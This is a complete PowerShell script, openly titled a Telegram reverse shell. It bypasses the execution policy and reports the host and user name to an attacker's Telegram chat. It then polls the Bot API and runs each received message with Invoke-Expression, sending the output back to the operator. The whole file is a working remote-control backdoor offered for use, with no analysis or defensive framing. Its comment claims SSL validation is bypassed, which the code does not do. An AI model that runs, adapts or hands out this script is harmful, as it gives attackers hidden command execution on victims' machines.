# Telegram Reverse Shell
# This script creates a reverse shell through Telegram Bot API

param(
    [string]$BotToken = "YOUR_BOT_TOKEN_HERE",
    [string]$ChatID = "YOUR_CHAT_ID_HERE"
)

# Bypass execution policy and SSL validation
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Function to send message to Telegram
function Send-TelegramMessage {
    param([string]$Message)
    
    try {
        $uri = "https://api.telegram.org/bot$BotToken/sendMessage"
        $body = @{
            chat_id = $ChatID
            text = $Message
            parse_mode = "HTML"
        }
        
        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
        return $true
    } catch {
        Write-Host "Error sending message: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to get updates from Telegram
function Get-TelegramUpdates {
    try {
        $uri = "https://api.telegram.org/bot$BotToken/getUpdates"
        $response = Invoke-RestMethod -Uri $uri -Method Get
        return $response
    } catch {
        Write-Host "Error getting updates: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to execute command and return output
function Invoke-CommandAndRespond {
    param([string]$Command)
    
    try {
        # Execute the command
        $output = Invoke-Expression -Command $Command 2>&1 | Out-String
        
        # If output is too long, truncate it
        if ($output.Length -gt 4000) {
            $output = $output.Substring(0, 4000) + "... [output truncated]"
        }
        
        # If no output, indicate that
        if ([string]::IsNullOrEmpty($output)) {
            $output = "Command executed successfully (no output)"
        }
        
        return $output
    } catch {
        return "Error executing command: $($_.Exception.Message)"
    }
}

# Main reverse shell function
function Start-ReverseShell {
    Write-Host "Starting Telegram Reverse Shell..." -ForegroundColor Green
    Write-Host "Bot Token: $BotToken" -ForegroundColor Yellow
    Write-Host "Chat ID: $ChatID" -ForegroundColor Yellow
    Write-Host "Press Ctrl+C to exit" -ForegroundColor Red
    
    # Send startup message
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $startMessage = "ï¿½ Reverse Shell Connected ðŸ”Œ`n`nHost: $hostname`nUser: $username`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Send-TelegramMessage -Message $startMessage | Out-Null
    
    $lastUpdateId = 0
    
    # Main loop
    while ($true) {
        try {
            # Get updates from Telegram
            $updates = Get-TelegramUpdates
            if ($updates -and $updates.ok -eq $true) {
                foreach ($update in $updates.result) {
                    # Only process new messages
                    if ($update.update_id -gt $lastUpdateId -and $update.message -and $update.message.text) {
                        $lastUpdateId = $update.update_id
                        $messageText = $update.message.text
                        $fromUser = $update.message.from.first_name
                        
                        Write-Host "Received command: $messageText" -ForegroundColor Cyan
                        
                        # Check for exit command
                        if ($messageText -eq "exit") {
                            $exitMessage = "ðŸ”Œ Reverse Shell Disconnected`n`nHost: $hostname`nUser: $username`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
                            Send-TelegramMessage -Message $exitMessage | Out-Null
                            Write-Host "Exit command received. Disconnecting..." -ForegroundColor Yellow
                            return
                        }
                        
                        # Execute command and send response
                        $output = Invoke-CommandAndRespond -Command $messageText
                        $responseMessage = "ðŸ’» <b>Command:</b> <code>$messageText</code>`n`nðŸ“¤ <b>Output:</b>`n<pre>$output</pre>"
                        
                        # Send response
                        Send-TelegramMessage -Message $responseMessage | Out-Null
                        Write-Host "Command executed and response sent" -ForegroundColor Green
                    }
                }
            }
            
            # Wait before checking for new messages
            Start-Sleep -Seconds 2
        } catch {
            Write-Host "Error in main loop: $($_.Exception.Message)" -ForegroundColor Red
            Start-Sleep -Seconds 5
        }
    }
}

# Start the reverse shell
Start-ReverseShell
